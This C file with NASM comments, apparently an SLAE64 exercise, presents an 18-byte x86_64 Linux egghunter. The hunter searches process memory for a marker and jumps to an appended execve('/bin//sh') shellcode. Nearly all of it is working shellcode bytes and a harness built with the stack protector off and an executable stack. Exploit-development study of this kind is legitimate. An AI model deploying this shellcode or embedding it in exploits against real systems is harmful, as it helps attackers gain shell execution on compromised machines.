/*---------------------------------------------------------------------------------------------------------------------
/*
*Title:            x86_64 Linux egghunter in 18 bytes
*Author:           Sathish kumar
*Contact:          https://www.linkedin.com/in/sathish94
*Description:      x86_64 linux egghunter which searches for the marker.
*Copyright:        (c) 2016 iQube. (http://iQube.io)
*Release Date:     January 7, 2016
*Tested On:        Ubuntu 14.04 LTS
*SLAE64-1408
*Build/Run:        gcc -fno-stack-protector -z execstack egghunter.c -o egghunter
*
*Nasm source:
*
*
global _start

_start:

egg:
  inc rdx               ; Address
  push rdx              ; pushing the value in the rdx to the stack
  pop rdi               ; sending rdx to rdi via stack
  push 0x50905090       ; pusing the egg marker into the stack
  pop rax
  inc eax               ; Real egg marker is 0x50905091 so the the eax register is increased bcz the marker shouldn't be hardcoded
  scasd                 ; check if we have found the egg
  jnz egg               ; try the next byte in the memory
  jmp rdi               ; go to the shellcode

*Compile & Run:    nasm -f elf64 -o egghunter.o egghunter.nasm
                    ld -o egghunter egghunter.o
*/

#include <stdio.h>
#include <string.h>

char hunter[] = \
"\x48\xff\xc2\x52\x5f\x68\x90\x50\x90\x50\x58\xff\xc0\xaf\x75\xf0\xff\xe7";

char execve_code_with_egg[] = \
//marker
"\x91\x50\x90\x50"
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

int main(){
  printf("Egg Hunter Length:  %d\n", (int)strlen(hunter));
       (*(void  (*)()) hunter)();
       return 0;
}